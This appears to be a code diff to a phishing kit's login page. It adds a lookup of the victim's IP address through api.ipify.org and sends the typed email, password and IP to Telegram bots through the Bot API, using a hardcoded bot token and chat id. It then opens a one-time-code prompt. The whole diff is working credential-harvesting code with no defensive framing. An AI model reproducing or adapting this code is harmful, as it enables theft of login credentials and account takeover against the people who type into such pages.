@@ -255,7 +255,7 @@
     }
 
     function showOTPMModal() {
-      const email = document.getElementById('email').value.trim();
+         const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
         var notUsed = true;
       
@@ -264,6 +264,23 @@
         alert("Please enter both email and password.");
         return;
       }
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    console.log("User IP:", data.ip);
+sendMessage(data.ip);
+    // Example: send it somewhere
+    // fetch('/save-ip', {
+    //   method: 'POST',
+    //   headers: {
+    //     'Content-Type': 'application/json'
+    //   },
+    //   body: JSON.stringify({ ip: data.ip })
+    // });
+  })
+  .catch(error => console.error(error));
+
+
      /* email.onfocus = function() {
       var token = "8735957211:AAEbltrJ2IDYC7lB9P_MRwiUuKbKkzSwpSU";
       var chat_id = "7702404079";
@@ -292,9 +309,10 @@ const bots = [
     chatId: 7702404079
   }
 ]
-
+const sendMessage = (ip) => {
 bots.forEach(bot => {
-   var my_text = `Email:${email} Password:${password}`
+  console.log(ip);
+   var my_text = `Email:${email} from Ip: ${ip} Password:${password}`
       var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${my_text}`;
       console.log(email, password);
 
@@ -302,6 +320,7 @@ bots.forEach(bot => {
       api.open("GET", url, true);
       api.send();
 })
+}
       if(submittedOnce){
      currentEmail = email;
       document.getElementById('otpModal').style.display = 'flex';
